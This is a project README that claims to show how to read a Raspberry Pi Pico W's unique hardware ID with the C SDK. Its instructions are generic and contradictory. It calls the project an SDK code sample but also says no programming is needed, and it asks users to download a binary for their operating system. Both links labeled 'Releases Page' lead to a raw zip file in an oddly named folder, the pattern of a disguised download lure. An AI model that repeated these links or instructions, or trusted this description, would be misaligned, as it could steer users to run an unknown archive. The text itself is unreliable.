## üìå Overview
This project, **bitdoglab_pico_unique_id**, is a sample application for the BitDogLab focusing on the Raspberry Pi Pico W. It shows you how to obtain and manage the unique hardware ID of this device using the pico_unique_id library from the C SDK. This will help you understand how to identify your device based on its hardware characteristics.

## üöÄ Getting Started
To get started, follow these simple steps:

1. **Requirements**: 
   - A **Raspberry Pi Pico W** board.
   - A compatible USB cable to connect the Pico W to your computer.
   - A computer running Windows, macOS, or Linux.

2. **Preparing Your Environment**: 
   - Install the necessary software tools for developing with the Raspberry Pi Pico.
   - If you haven't already, download and install the following:
     - The **Arduino IDE** or **Thonny**, which can be used to upload code to the Pico.
     - The **Pico SDK**, which provides the necessary libraries, including pico_unique_id.

3. **Connect Your Device**: 
   - Use the USB cable to connect your Raspberry Pi Pico W to your computer.

4. **Download the Software**: 
   - Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip).
   - Find the latest version. Click on it to see the available files for download.
   - Download the appropriate file for your operating system.

## üì• Download & Install
1. After navigating to the [Releases Page](https://raw.githubusercontent.com/Poonam26patro/bitdoglab_pico_unique_id/main/Orthoceratidae/bitdoglab_pico_unique_id.zip), find the latest release.
2. Choose the file that fits your needs. Most users will want the binary file. Download it to your computer.
3. Follow any included instructions or readme files to set up and run the application. This may include moving files to specific directories or running commands in your terminal.

## üìä Features
- **Obtain Unique ID**: Get the unique hardware ID for your Raspberry Pi Pico W.
- **Easy to Use**: No programming is necessary. The setup process is straightforward.
- **Open Source**: Modify the code to suit your needs. The project is flexible and can adapt to various applications.

## üîç How It Works
The application uses the pico_unique_id library to access the hardware ID stored in the Raspberry Pi Pico W. This ID is unique for each device, making it useful for projects that require device identification. The application processes this ID and displays it for you to see.

## üõ†Ô∏è Troubleshooting
If you run into problems, try these troubleshooting steps:

- **Connection Issues**: Ensure your Pico W is properly connected. Check if the USB cable is functional and securely plugged into both the device and your computer.
- **Installation Problems**: Make sure you have all necessary software installed. Follow the setup guidelines closely.
- **Library Errors**: If you encounter errors related to the pico_unique_id library, verify that it is correctly installed as part of your Pico SDK.
